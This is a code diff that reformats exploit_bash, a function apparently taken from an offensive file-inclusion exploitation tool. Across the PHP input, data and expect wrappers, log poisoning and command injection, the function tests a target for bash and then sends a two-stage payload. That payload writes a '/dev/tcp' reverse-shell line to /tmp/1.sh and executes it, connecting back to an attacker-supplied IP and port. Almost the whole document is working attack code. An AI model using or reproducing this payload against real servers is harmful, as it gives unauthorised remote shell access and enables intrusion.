@@ -7,77 +7,288 @@ from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
 from src.utils import colors
 
-def exploit_bash(exploit, method, ip, port):
-    
-    url = exploit['GETVAL']
-    post = exploit["POSTVAL"]
-    
-    print(colors.purple("[?]") + " Checking if bash is available on the target system...")
 
-    if(method == "INPUT" and config.tempArg not in url):
+def exploit_bash(exploit, method, ip, port):
+
+    url = exploit["GETVAL"]
+    post = exploit["POSTVAL"]
+
+    print(
+        colors.purple("[?]") + " Checking if bash is available on the target system..."
+    )
+
+    if method == "INPUT" and config.tempArg not in url:
         bashTest = "which bash"
-        bashPayloadStageOne = "echo 'bash -i >& /dev/tcp/"+ip+"/"+str(port)+"+0>&1'>/tmp/1.sh"
+        bashPayloadStageOne = (
+            "echo 'bash -i >& /dev/tcp/" + ip + "/" + str(port) + "+0>&1'>/tmp/1.sh"
+        )
         bashPayloadStageTwo = "bash /tmp/1.sh"
 
-    else: 
+    else:
         bashTest = "which%20bash"
-        bashPayloadStageOne = "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh"
+        bashPayloadStageOne = (
+            "echo+'bash+-i+>%26+/dev/tcp/" + ip + "/" + str(port) + "+0>%261'>/tmp/1.sh"
+        )
         bashPayloadStageTwo = "bash+/tmp/1.sh"
-    
-    if(method == "INPUT"):
-        if(args.postreq): res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashTest)), config.proxies, "", "", exploit = True)
-        else:  res, _ = request.REQUEST(url.replace(config.tempArg, encode(bashTest)), args.httpheaders, post, config.proxies, "", "", exploit = True)
-        
-        if("/bash" in res.text):
+
+    if method == "INPUT":
+        if args.postreq:
+            res, _ = request.REQUEST(
+                url,
+                args.httpheaders,
+                post.replace(config.tempArg, encode(bashTest)),
+                config.proxies,
+                "",
+                "",
+                exploit=True,
+            )
+        else:
+            res, _ = request.REQUEST(
+                url.replace(config.tempArg, encode(bashTest)),
+                args.httpheaders,
+                post,
+                config.proxies,
+                "",
+                "",
+                exploit=True,
+            )
+
+        if "/bash" in res.text:
             printInfo(ip, port, "bash", "input wrapper")
-            if(args.postreq):
-                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashPayloadStageOne)), config.proxies, "", "", exploit = True)
-                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashPayloadStageTwo)), config.proxies, "", "", exploit = True)
+            if args.postreq:
+                request.REQUEST(
+                    url,
+                    args.httpheaders,
+                    post.replace(config.tempArg, encode(bashPayloadStageOne)),
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
+                request.REQUEST(
+                    url,
+                    args.httpheaders,
+                    post.replace(config.tempArg, encode(bashPayloadStageTwo)),
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
             else:
-                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageOne)), args.httpheaders, post, config.proxies, "", "")
-                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageTwo)), args.httpheaders, post, config.proxies, "", "", exploit = True)
+                request.REQUEST(
+                    url.replace(config.tempArg, encode(bashPayloadStageOne)),
+                    args.httpheaders,
+                    post,
+                    config.proxies,
+                    "",
+                    "",
+                )
+                request.REQUEST(
+                    url.replace(config.tempArg, encode(bashPayloadStageTwo)),
+                    args.httpheaders,
+                    post,
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
 
-    if(method == "DATA"):
-        if(args.postreq): 
-            res,_ = request.REQUEST(url.replace(config.tempArg, encode(bashTest)), args.httpheaders, post, config.proxies, "", "", exploit = True)
-        else: 
-            res, _ = request.REQUEST(url.replace(config.tempArg, encode(bashTest)), args.httpheaders, "", config.proxies, "", "", exploit = True)
-        if("/bash" in res.text):
+    if method == "DATA":
+        if args.postreq:
+            res, _ = request.REQUEST(
+                url.replace(config.tempArg, encode(bashTest)),
+                args.httpheaders,
+                post,
+                config.proxies,
+                "",
+                "",
+                exploit=True,
+            )
+        else:
+            res, _ = request.REQUEST(
+                url.replace(config.tempArg, encode(bashTest)),
+                args.httpheaders,
+                "",
+                config.proxies,
+                "",
+                "",
+                exploit=True,
+            )
+        if "/bash" in res.text:
             printInfo(ip, port, "bash", "data wrapper")
-            if(args.postreq):
-                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageOne)), args.httpheaders, post, config.proxies, "", "", exploit = True)
-                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageTwo)), args.httpheaders, post, config.proxies, "", "", exploit = True)
+            if args.postreq:
+                request.REQUEST(
+                    url.replace(config.tempArg, encode(bashPayloadStageOne)),
+                    args.httpheaders,
+                    post,
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
+                request.REQUEST(
+                    url.replace(config.tempArg, encode(bashPayloadStageTwo)),
+                    args.httpheaders,
+                    post,
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
             else:
-                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageOne)), args.httpheaders, "", config.proxies, "", "", exploit = True)
-                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageTwo)), args.httpheaders, "", config.proxies, "", "", exploit = True)
+                request.REQUEST(
+                    url.replace(config.tempArg, encode(bashPayloadStageOne)),
+                    args.httpheaders,
+                    "",
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
+                request.REQUEST(
+                    url.replace(config.tempArg, encode(bashPayloadStageTwo)),
+                    args.httpheaders,
+                    "",
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
 
-    if(method == "EXPECT"):
-        if(args.postreq): 
-            res,_ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashTest)), config.proxies, "", "", exploit = True)
-        else: 
-            res, _ = request.REQUEST(url.replace(config.tempArg, encode(bashTest)), args.httpheaders, "", config.proxies, "", "", exploit = True)
-        if("/bash" in res.text):
+    if method == "EXPECT":
+        if args.postreq:
+            res, _ = request.REQUEST(
+                url,
+                args.httpheaders,
+                post.replace(config.tempArg, encode(bashTest)),
+                config.proxies,
+                "",
+                "",
+                exploit=True,
+            )
+        else:
+            res, _ = request.REQUEST(
+                url.replace(config.tempArg, encode(bashTest)),
+                args.httpheaders,
+                "",
+                config.proxies,
+                "",
+                "",
+                exploit=True,
+            )
+        if "/bash" in res.text:
             printInfo(ip, port, "bash", "expect wrapper")
-            if(args.postreq):
-                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashPayloadStageOne)), post, config.proxies, "", "", exploit = True)
-                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashPayloadStageTwo)), post, config.proxies, "", "", exploit = True)
+            if args.postreq:
+                request.REQUEST(
+                    url,
+                    args.httpheaders,
+                    post.replace(config.tempArg, encode(bashPayloadStageOne)),
+                    post,
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
+                request.REQUEST(
+                    url,
+                    args.httpheaders,
+                    post.replace(config.tempArg, encode(bashPayloadStageTwo)),
+                    post,
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
             else:
-                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageOne)), args.httpheaders, "", config.proxies, "", "", exploit = True)
-                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageTwo)), args.httpheaders, "", config.proxies, "", "", exploit = True)
+                request.REQUEST(
+                    url.replace(config.tempArg, encode(bashPayloadStageOne)),
+                    args.httpheaders,
+                    "",
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
+                request.REQUEST(
+                    url.replace(config.tempArg, encode(bashPayloadStageTwo)),
+                    args.httpheaders,
+                    "",
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
 
-    if(method == "TRUNC"):
-        exploit_log_poison(ip, port, url, encode(bashPayloadStageOne), encode(bashPayloadStageTwo), bashTest, "/bash", exploit['POSTVAL'])
-   
-    if(method == "CMD"):
-        if(args.postreq): 
-            res,_ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashTest)), config.proxies, "", "", exploit = True)
-        else: 
-            res,_ = request.REQUEST(url.replace(config.tempArg, encode(bashTest)), args.httpheaders, "", config.proxies, "", "", exploit = True)
-        if("/bin" in res.text and "/bash" in res.text):
+    if method == "TRUNC":
+        exploit_log_poison(
+            ip,
+            port,
+            url,
+            encode(bashPayloadStageOne),
+            encode(bashPayloadStageTwo),
+            bashTest,
+            "/bash",
+            exploit["POSTVAL"],
+        )
+
+    if method == "CMD":
+        if args.postreq:
+            res, _ = request.REQUEST(
+                url,
+                args.httpheaders,
+                post.replace(config.tempArg, encode(bashTest)),
+                config.proxies,
+                "",
+                "",
+                exploit=True,
+            )
+        else:
+            res, _ = request.REQUEST(
+                url.replace(config.tempArg, encode(bashTest)),
+                args.httpheaders,
+                "",
+                config.proxies,
+                "",
+                "",
+                exploit=True,
+            )
+        if "/bin" in res.text and "/bash" in res.text:
             printInfo(ip, port, "bash", "command injection")
-            if(args.postreq):
-                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashPayloadStageOne)), config.proxies, "", "", exploit = True)
-                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashPayloadStageTwo)), config.proxies, "", "", exploit = True)
-            else: 
-                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageOne)), args.httpheaders, "", config.proxies, "", "", exploit = True)
-                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageTwo)), args.httpheaders, "", config.proxies, "", "", exploit = True)
+            if args.postreq:
+                request.REQUEST(
+                    url,
+                    args.httpheaders,
+                    post.replace(config.tempArg, encode(bashPayloadStageOne)),
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
+                request.REQUEST(
+                    url,
+                    args.httpheaders,
+                    post.replace(config.tempArg, encode(bashPayloadStageTwo)),
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
+            else:
+                request.REQUEST(
+                    url.replace(config.tempArg, encode(bashPayloadStageOne)),
+                    args.httpheaders,
+                    "",
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
+                request.REQUEST(
+                    url.replace(config.tempArg, encode(bashPayloadStageTwo)),
+                    args.httpheaders,
+                    "",
+                    config.proxies,
+                    "",
+                    "",
+                    exploit=True,
+                )
